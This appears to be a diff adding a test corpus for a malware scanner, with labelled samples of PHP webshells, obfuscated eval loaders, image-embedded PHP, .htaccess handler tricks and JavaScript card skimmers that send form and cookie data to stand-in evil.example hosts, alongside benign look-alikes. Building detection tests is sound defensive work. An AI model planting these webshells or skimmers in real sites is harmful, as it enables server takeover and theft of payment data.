@@ -1,0 +1,434 @@
+# Detection corpus for tests/detection.rs.
+#
+# Each sample is the content of one file.  `class` is the file class the
+# scanner would assign, `expect` the minimum severity of a content finding
+# (`critical`, `warning`) or `clean` for look-alikes that must stay silent.
+# `rule` names a rule that has to be among the hits.  The samples are short,
+# publicly documented techniques; none of them is a working tool.
+#
+# Bytes above 0x7f are written as \u00XX and stored as single bytes.
+
+[[sample]]
+name = "plain_one_liner"
+class = "php"
+expect = "critical"
+rule = "php_china_chopper"
+content = "<?php @eval($_POST['x']);"
+
+[[sample]]
+name = "comment_between_tokens"
+class = "php"
+expect = "critical"
+content = "<?php eval/**/($_POST['x']);"
+
+[[sample]]
+name = "line_comment_between_tokens"
+class = "php"
+expect = "critical"
+content = "<?php eval # harmless\n ($_POST['x']);"
+
+[[sample]]
+name = "comment_after_paren"
+class = "php"
+expect = "critical"
+content = "<?php system(/*x*/$_GET['c']);"
+
+[[sample]]
+name = "name_from_concat"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = 'ass' . 'ert'; $f($_REQUEST['c']);"
+
+[[sample]]
+name = "name_from_hex_escapes"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = \"\\x73\\x79\\x73\\x74\\x65\\x6d\"; $f($_GET['c']);"
+
+[[sample]]
+name = "name_from_octal_escapes"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = \"\\163\\171\\163\\164\\145\\155\"; $f($_GET['c']);"
+
+[[sample]]
+name = "name_from_unicode_escape"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = \"\\u{73}ystem\"; $f($_GET['c']);"
+
+[[sample]]
+name = "name_from_chr"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($_GET[1]);"
+
+[[sample]]
+name = "name_from_strrev"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = strrev('metsys'); $f($_COOKIE['c']);"
+
+[[sample]]
+name = "name_from_rot13"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = str_rot13('cnffgueh'); $f($_COOKIE['c']);"
+
+[[sample]]
+name = "name_from_base64"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = base64_decode('c2hlbGxfZXhlYw=='); echo $f($_POST['c']);"
+
+[[sample]]
+name = "name_nested_decoders"
+class = "php"
+expect = "critical"
+rule = "php_hidden_function_name"
+content = "<?php $f = strrev(str_rot13('zrg'.'flf')); $f($_POST['c']);"
+
+[[sample]]
+name = "superglobal_from_concat"
+class = "php"
+expect = "critical"
+rule = "php_hidden_superglobal"
+content = "<?php $p = ${'_PO'.'ST'}; if (isset($p['k'])) { $q = 'pass'.'thru'; $q($p['k']); }"
+
+[[sample]]
+name = "superglobal_via_globals"
+class = "php"
+expect = "critical"
+rule = "php_hidden_superglobal"
+content = "<?php $r = $GLOBALS['_REQ'.'UEST']; $r['f']($r['a']);"
+
+[[sample]]
+name = "classic_gzinflate_base64"
+class = "php"
+expect = "critical"
+content = "<?php eval(gzinflate(base64_decode('y0zTyCwuTi3RUIkP8A8OiVbPVo/V1KxWcCiuLC5JzUURtlaoVdDXUiguSUxPVSgpz1fQ0gcA')));"
+
+[[sample]]
+name = "payload_with_hidden_decoders"
+class = "php"
+expect = "critical"
+rule = "encoded_payload_executes_code"
+content = "<?php $d = 'y0zTyCwuTi3RUIkP8A8OiVbPVo/V1KxWcCiuLC5JzUURtlaoVdDXUiguSUxPVSgpz1fQ0gcA'; $a = 'base'.'64_decode'; $b = 'gzin'.'flate'; $c = 'create_'.'function'; $x = $c('', $b($a($d))); $x();"
+
+[[sample]]
+name = "payload_decoded_through_variables"
+class = "php"
+expect = "critical"
+rule = "encoded_payload_executes_code"
+content = "<?php\n$blob = 'aWYoaXNzZXQoJF9QT1NUWydrJ10pKXsgQHN5c3RlbSgkX1BPU1RbJ2snXSk7IH0gLyogc3RhZ2UgdHdvICov';\n$step = 'base64_decode';\n$code = $step($blob);\n$run = 'create_function';\n$fn = $run('', $code);\n$fn();"
+
+[[sample]]
+name = "payload_reversed_base64"
+class = "php"
+expect = "critical"
+rule = "encoded_payload_executes_code"
+content = "<?php $k = 'voCIvdHdgU2ZhR3cgoyLg0HI7kSXns2JbR1UPB1XkgSblR3c5NHQgsXKp01JrdyWUN1TQ9FJoQXZzNXaoYWa'; $o = 'strrev'; $u = 'base64_decode'; $z = $u($o($k)); $w = 'assert'; $w($z);"
+
+[[sample]]
+name = "payload_two_layers"
+class = "php"
+expect = "critical"
+rule = "encoded_payload_executes_code"
+content = "<?php $v = 'ZXZhbChnemluZmxhdGUoYmFzZTY0X2RlY29kZSgneTB6VHlDd3VUaTNSVUlrUDhBOE9pVmJQVm8vVjFLeFdjQ2l1TEM1SnpVVVJ0bGFvVmREWFVpZ3VTVXhQVlNncHoxZlEwZ2NBJykpKTs='; $n = 'base64_decode'; $m = $n($v); $h = 'create_function'; $g = $h('', $m); $g();"
+
+[[sample]]
+name = "payload_in_heredoc"
+class = "php"
+expect = "critical"
+rule = "encoded_payload_executes_code"
+content = "<?php\n$blob = <<<'EOT'\naWYoaXNzZXQoJF9QT1NUWydrJ10pKXsgQHN5c3RlbSgkX1BPU1RbJ2snXSk7IH0gLyogc3RhZ2UgdHdvICov\nEOT;\n$t = 'base64_decode'; $j = $t($blob); $e = 'create_function'; $i = $e('', $j); $i();"
+
+[[sample]]
+name = "callback_array_map"
+class = "php"
+expect = "critical"
+rule = "php_callback_exec_input"
+content = "<?php array_map($_GET['f'], array($_GET['a']));"
+
+[[sample]]
+name = "callback_call_user_func"
+class = "php"
+expect = "critical"
+rule = "php_callback_exec_input"
+content = "<?php call_user_func($_POST['f'], $_POST['a']);"
+
+[[sample]]
+name = "callback_usort"
+class = "php"
+expect = "critical"
+rule = "php_callback_exec_input"
+content = "<?php $a = array($_GET['a'], 1); usort($a, $_GET['f']);"
+
+[[sample]]
+name = "decoded_cookie_command"
+class = "php"
+expect = "critical"
+rule = "php_exec_decoded_request_input"
+content = "<?php if (isset($_COOKIE['sid'])) { passthru(base64_decode($_COOKIE['sid'])); }"
+
+[[sample]]
+name = "http_header_channel"
+class = "php"
+expect = "critical"
+rule = "php_exec_decoded_request_input"
+content = "<?php $h = getallheaders(); if (isset($h['X-Run'])) { system(getallheaders()['X-Run']); }"
+
+[[sample]]
+name = "php_input_eval"
+class = "php"
+expect = "critical"
+rule = "php_exec_decoded_request_input"
+content = "<?php eval(file_get_contents('php://input'));"
+
+[[sample]]
+name = "backtick_shell"
+class = "php"
+expect = "critical"
+rule = "php_backtick_exec_input"
+content = "<?php echo `{$_GET['c']}`; $o = `$_POST[c]`;"
+
+[[sample]]
+name = "non_alphanumeric_xor"
+class = "php"
+expect = "critical"
+rule = "php_nonalpha_webshell"
+content = "<?php $_ = ('%01'^'`').('%13'^'`').('%13'^'`'); $__ = '`{{{'^'?<>/'; ${$__}[_](${$__}[__]);"
+
+[[sample]]
+name = "non_alphanumeric_increment"
+class = "php"
+expect = "critical"
+rule = "php_nonalpha_webshell"
+content = "<?php $_=[];$_=@\"$_\";$_=$_['!'=='@'];$__=$_;$__++;$__++;$__++;$__++;$___=$__;$___++;$___++;$___++;$___++;"
+
+[[sample]]
+name = "bitwise_not_name"
+class = "php"
+expect = "critical"
+rule = "php_nonalpha_webshell"
+content = "<?php $f = ~\"\\x8c\\x86\\x8c\\x8b\\x9a\\x92\"; $f($_POST[1]);"
+
+[[sample]]
+name = "ld_preload_bypass"
+class = "php"
+expect = "critical"
+rule = "php_disable_functions_bypass"
+content = "<?php move_uploaded_file($_FILES['f']['tmp_name'], '/tmp/x.so'); putenv('LD_PRELOAD=/tmp/x.so'); mail('a@b','','','');"
+
+[[sample]]
+name = "preg_replace_e_single"
+class = "php"
+expect = "critical"
+rule = "php_preg_replace_eval"
+content = "<?php preg_replace('/.*/e', $_POST['c'], '');"
+
+[[sample]]
+name = "preg_replace_e_double"
+class = "php"
+expect = "critical"
+rule = "php_preg_replace_eval"
+content = "<?php preg_replace(\"#x#ie\", stripslashes($_REQUEST[\"c\"]), \"x\");"
+
+[[sample]]
+name = "extract_then_variable_call"
+class = "php"
+expect = "warning"
+rule = "php_extract_request_exec"
+content = "<?php extract($_REQUEST); $a($b);"
+
+[[sample]]
+name = "phpinfo_only"
+class = "php"
+expect = "warning"
+rule = "php_phpinfo_only"
+content = "<?php phpinfo(); ?>\n"
+
+[[sample]]
+name = "php_in_ico"
+class = "image"
+expect = "critical"
+rule = "php_code_in_image"
+content = "<?php $c = $_COOKIE; if (isset($c['z'])) { eval(base64_decode($c['z'])); }"
+
+[[sample]]
+name = "php_appended_to_gif"
+class = "image"
+expect = "critical"
+rule = "php_hidden_in_image_header"
+content = "GIF89a\u0001\u0000\u0001\u0000\u0000\u0000\u0000;\n<?php system($_GET['c']); ?>"
+
+[[sample]]
+name = "php_in_dat_file"
+class = "other"
+expect = "critical"
+rule = "php_file_with_foreign_extension"
+content = "<?php eval(gzinflate(base64_decode('y0zTyCwuTi3RUIkP8A8OiVbPVo/V1KxWcCiuLC5JzUURtlaoVdDXUiguSUxPVSgpz1fQ0gcA')));"
+
+[[sample]]
+name = "htaccess_handler"
+class = "htaccess"
+expect = "critical"
+content = "<FilesMatch \"\\.jpg$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\nAddHandler application/x-httpd-php .png\n"
+
+[[sample]]
+name = "user_ini_prepend"
+class = "ini"
+expect = "critical"
+rule = "htaccess_auto_prepend"
+content = "auto_prepend_file = /var/www/shop/media/.cache.ico\n"
+
+[[sample]]
+name = "htaccess_referer_redirect"
+class = "htaccess"
+expect = "warning"
+rule = "htaccess_rewrite_to_hidden_script"
+content = "RewriteEngine On\nRewriteCond %{HTTP_REFERER} (google|bing|yahoo) [NC]\nRewriteRule ^(.*)$ https://pills.example/go.php?u=$1 [R=302,L]\n"
+
+[[sample]]
+name = "js_skimmer_plain"
+class = "js"
+expect = "critical"
+content = "document.querySelector('#place_order').addEventListener('click',function(){var d={n:document.getElementById('card_number').value,c:document.getElementById('cvv').value};new Image().src='https://stats.evil.example/p.gif?d='+btoa(JSON.stringify(d));});"
+
+[[sample]]
+name = "js_loader_split_names"
+class = "js"
+expect = "warning"
+rule = "js_hidden_loader"
+content = "var a = window['at' + 'ob']; var s = document['createEl' + 'ement']('script'); s.src = a('aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYy5qcw=='); document.head.appendChild(s);"
+
+[[sample]]
+name = "js_loader_escaped_url"
+class = "js"
+expect = "warning"
+content = "var u = '\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2f\\x67'; var i = new Image(); i.src = u;"
+
+[[sample]]
+name = "js_payload_in_atob"
+class = "js"
+expect = "critical"
+rule = "js_encoded_payload_loader"
+content = "var k = 'dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vY2RuLmV2aWwtbWV0cmljcy5leGFtcGxlL2MuanM/ZD0nK2J0b2EoZG9jdW1lbnQuY29va2llKTtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHMpOw=='; var r = window['Fun' + 'ction']; r(window['at' + 'ob'](k))();"
+
+[[sample]]
+name = "js_websocket_skimmer"
+class = "js"
+expect = "critical"
+content = "var f=document.querySelectorAll('input');var w=new WebSocket('wss://sock.evil.example/x');w.onopen=function(){var o={};for(var i=0;i<f.length;i++){o[f[i].name]=f[i].value}o.cc=document.getElementById('cc_number').value;w.send(btoa(JSON.stringify(o)))};"
+
+[[sample]]
+name = "cms_block_loader_split_names"
+class = "template"
+expect = "warning"
+rule = "js_hidden_loader"
+content = "<div class=\"footer-note\">Versand ab 50 EUR frei.</div>\n<script>var a = window['at' + 'ob']; var s = document['createEl' + 'ement']('script'); s.src = a('aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYy5qcw=='); document.head.appendChild(s);</script>"
+
+[[sample]]
+name = "cms_block_payload_in_atob"
+class = "template"
+expect = "critical"
+rule = "js_encoded_payload_loader"
+content = "<p>Unsere Zahlungsarten</p>\n<script>var k = 'dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHBzOi8vY2RuLmV2aWwtbWV0cmljcy5leGFtcGxlL2MuanM/ZD0nK2J0b2EoZG9jdW1lbnQuY29va2llKTtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHMpOw=='; var r = window['Fun' + 'ction']; r(window['at' + 'ob'](k))();</script>"
+
+[[sample]]
+name = "benign_sentence_concat"
+class = "php"
+expect = "clean"
+content = "<?php $msg = 'Hello ' . 'world'; $sql = 'SELECT * FROM ' . 'wp_posts' . ' WHERE id = %d';"
+
+[[sample]]
+name = "benign_function_blocklist"
+class = "php"
+expect = "clean"
+content = "<?php $dangerous = array('system', 'exec', 'passthru', 'shell_exec', 'eval', 'assert'); if (in_array($name, $dangerous, true)) { throw new Exception('blocked'); }"
+
+[[sample]]
+name = "benign_preg_replace"
+class = "php"
+expect = "clean"
+content = "<?php $m = preg_replace('/files\":(.*)\"\"/', 'files\":$1\",\"', $m); $t = preg_replace('/\\s+/', ' ', $t); $e = preg_replace('#/+#', '/', $path);"
+
+[[sample]]
+name = "benign_embedded_png"
+class = "php"
+expect = "clean"
+content = "<?php $logo = base64_decode('AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5fYGFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6e3x9fn+AgYKDhIWGh4iJiouMjY6PkJGSk5SVlpeYmZqbnJ2en6ChoqOkpaanqKmqq6ytrq+wsbKztLW2t7i5uru8vb6/wMHCw8TFxsfIycrLzM3Oz9DR0tPU1dbX2Nna29zd3t/g4eLj5OXm5+jp6uvs7e7v8PHy8/T19vf4+fr7/P3+/wABAgMEBQYHCAkKCwwNDg8QERITFBUWFxgZGhscHR4fICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpbXF1eX2BhYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ent8fX5/gIGCg4SFhoeIiYqLjI2Oj5CRkpOUlZaXmJmam5ydnp+goaKjpKWmp6ipqqusra6vsLGys7S1tre4ubq7vL2+v8DBwsPExcbHyMnKy8zNzs/Q0dLT1NXW19jZ2tvc3d7f4OHi4+Tl5ufo6err7O3u7/Dx8vP09fb3+Pn6+/z9/v8='); header('Content-Type: image/png'); echo $logo;"
+
+[[sample]]
+name = "benign_embedded_json"
+class = "php"
+expect = "clean"
+content = "<?php $defaults = json_decode(base64_decode('eyJ0aXRsZSI6IlNldHRpbmdzIiwiZmllbGRzIjpbeyJpZCI6ImFwaV9rZXkiLCJ0eXBlIjoidGV4dCJ9LHsiaWQiOiJtb2RlIiwidHlwZSI6InNlbGVjdCJ9XX0='), true);"
+
+[[sample]]
+name = "benign_callbacks"
+class = "php"
+expect = "clean"
+content = "<?php $clean = array_map('sanitize_text_field', $_POST['items']); $rows = array_filter($_POST['rows']); call_user_func($this->callback, $_POST['id']); usort($_POST['list'], 'strcmp');"
+
+[[sample]]
+name = "benign_binary_strings"
+class = "php"
+expect = "clean"
+content = "<?php $bom = \"\\xEF\\xBB\\xBF\"; $crlf = chr(13) . chr(10); $nul = \"\\0\"; $mask = $a ^ $b; if (substr($s, 0, 3) === $bom) { $s = substr($s, 3); }"
+
+[[sample]]
+name = "benign_inline_type_comments"
+class = "php"
+expect = "clean"
+content = "<?php function add( /* int */ $a, /* int */ $b ) { return $a + $b; } // sum\n$r = add( 1, /* second */ 2 );"
+
+[[sample]]
+name = "benign_hash_check"
+class = "php"
+expect = "clean"
+content = "<?php if (md5($_POST['token']) !== $expected) { wp_die('Invalid token'); } update_option('my_setting', sanitize_text_field($_POST['value']));"
+
+[[sample]]
+name = "benign_js_split_tags"
+class = "js"
+expect = "clean"
+content = "document.write('<scr' + 'ipt src=\"' + base + '/widget.js\"></scr' + 'ipt>'); var api = 'https://' + location.host + '/wp-json/'; fetch(api + 'wp/v2/posts');"
+
+[[sample]]
+name = "benign_js_card_validation"
+class = "js"
+expect = "clean"
+content = "function validate(form){var n=form.querySelector('[name=card_number]').value.replace(/\\s+/g,'');if(!luhn(n)){showError('Kartennummer ungueltig');return false}return true}"
+
+[[sample]]
+name = "benign_readme_with_php"
+class = "other"
+expect = "clean"
+content = "Usage\n=====\n\nAdd this to your theme:\n\n<?php echo do_shortcode('[gallery]'); ?>\n\nNever call eval($_POST['x']) in your own code.\n"
+
+[[sample]]
+name = "benign_ca_bundle_text"
+class = "other"
+expect = "clean"
+content = "-----BEGIN CERTIFICATE-----\nMIIDdzCCAl+gAwIBAgIEAgAAuTANBgkqhkiG9w0BAQUFADBaMQswCQYDVQQGEwJJ\n-----END CERTIFICATE-----\n"
+
+[[sample]]
+name = "benign_cms_block_tag_manager"
+class = "template"
+expect = "clean"
+content = "<p>It's our summer sale - don't miss it!</p>\n<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-XXXX');</script>"
+
+[[sample]]
+name = "benign_cms_block_inline_svg"
+class = "template"
+expect = "clean"
+content = "<img alt=\"Logo\" src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48L3N2Zz4=\">"
